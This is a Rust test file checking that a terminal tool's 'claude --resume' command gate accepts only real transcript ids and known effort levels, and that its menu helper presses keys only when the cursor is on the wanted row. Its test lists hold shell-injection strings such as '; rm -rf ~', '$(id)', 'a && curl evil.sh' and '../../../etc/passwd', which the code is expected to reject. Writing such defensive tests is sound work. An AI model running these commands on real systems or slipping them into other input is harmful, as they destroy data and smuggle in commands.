//! The gate in front of `claude --resume <id>`.
//!
//! Its own test process because it rewrites `HOME`, which is global to a
//! process: inside `cargo test`'s shared binary that would follow whatever
//! else happened to be running on another thread.
//!
//! Two jobs are being checked here, and the second is the one that matters
//! most. First, a conversation Claude can no longer find must not be offered,
//! or a restored pane greets the user with an error where their agent should
//! be. Second, the id ends up **on a shell command line typed into a live
//! terminal**, so anything that is not a plain id has to be refused before it
//! gets there.

use amux_core::session::{
    claude_transcript_exists, resume_dialog_step, ResumeKey, ResumeMode, ResumePrefs,
};

#[test]
fn only_real_transcripts_with_plain_ids_are_offered() {
    let home = std::env::temp_dir().join(format!("amux-claude-home-{}", std::process::id()));
    let project = home.join(".claude").join("projects").join("-home-me-work");
    std::fs::create_dir_all(&project).unwrap();
    std::env::set_var("HOME", &home);

    let present = "aaa130ca-cf95-441c-9812-a6587b6dfced";
    std::fs::write(project.join(format!("{present}.jsonl")), b"{}\n").unwrap();

    // Found by scanning the project directories, so the caller never has to
    // reproduce Claude's lossy path-to-directory-name encoding.
    assert!(claude_transcript_exists(present));

    // A conversation that has been deleted, or never existed.
    assert!(!claude_transcript_exists("11111111-2222-3333-4444-555555555555"));

    // Everything below would be typed at a shell if it got through. None of it
    // may, whatever happens to exist on disk.
    for hostile in [
        "",
        "; rm -rf ~",
        "$(id)",
        "`id`",
        "a && curl evil.sh",
        "../../../etc/passwd",
        "id with space",
        "id\nsecond-line",
        "id|tee /tmp/x",
    ] {
        assert!(
            !claude_transcript_exists(hostile),
            "refused nothing for {hostile:?} — this string would reach a shell",
        );
    }

    std::env::remove_var("HOME");
    let _ = std::fs::remove_dir_all(&home);
}

/// `--effort` rides the same command line as the session id, so it gets the
/// same treatment: only the five levels Claude Code documents get through, and
/// anything else is dropped rather than pasted into a live terminal.
#[test]
fn only_known_effort_levels_reach_the_command_line() {
    let plain = ResumePrefs::default();
    assert_eq!(plain.resume_command("abc-123"), "claude --resume abc-123");

    let maxed = ResumePrefs { effort: Some("max".into()), ..Default::default() };
    assert_eq!(maxed.resume_command("abc-123"), "claude --resume abc-123 --effort max");

    for junk in ["", "MAX", "max; rm -rf /", "ultra"] {
        let bad = ResumePrefs { effort: Some(junk.into()), ..Default::default() };
        assert_eq!(
            bad.resume_command("abc-123"),
            "claude --resume abc-123",
            "unknown level {junk:?} must not reach the shell"
        );
    }
}

/// The menu is answered in two rounds with a fresh screen read between them:
/// the cursor moves first, and Enter only follows once the cursor is seen on
/// the wanted row.
#[test]
fn the_menu_is_walked_to_the_wanted_row_before_enter() {
    let on_one = "  \u{276f} 1. Resume from summary (recommended)\n    2. Resume full session as-is";
    let on_two = "    1. Resume from summary (recommended)\n  \u{276f} 2. Resume full session as-is";

    assert_eq!(resume_dialog_step(on_one, ResumeMode::Full), Some(ResumeKey::Down));
    assert_eq!(resume_dialog_step(on_two, ResumeMode::Full), Some(ResumeKey::Enter));
    assert_eq!(resume_dialog_step(on_one, ResumeMode::Summary), Some(ResumeKey::Enter));
    assert_eq!(resume_dialog_step(on_two, ResumeMode::Summary), Some(ResumeKey::Up));
}

/// The default has to stay hands-off: it is the mode a restore uses when the
/// person made no choice, and the menu it would be answering is a spend warning.
#[test]
fn ask_never_types_anything() {
    let on_one = "  \u{276f} 1. Resume from summary (recommended)";
    let on_two = "  \u{276f} 2. Resume full session as-is";
    assert_eq!(ResumeMode::default(), ResumeMode::Ask);
    assert_eq!(resume_dialog_step(on_one, ResumeMode::Ask), None);
    assert_eq!(resume_dialog_step(on_two, ResumeMode::Ask), None);
}

/// The reason the match is anchored on the cursor marker. A restored pane's own
/// scrollback can quote the menu — a conversation about this very feature does —
/// and pressing Enter at that would submit a prompt the person never wrote.
#[test]
fn menu_words_without_the_cursor_are_left_alone() {
    let scrollback = "We discussed the dialog: 1. Resume from summary, 2. Resume full session as-is.\n                      Resuming the full session will consume a substantial portion of your usage limits.";
    for mode in [ResumeMode::Full, ResumeMode::Summary] {
        assert_eq!(resume_dialog_step(scrollback, mode), None);
    }
    assert_eq!(resume_dialog_step("", ResumeMode::Full), None);
}
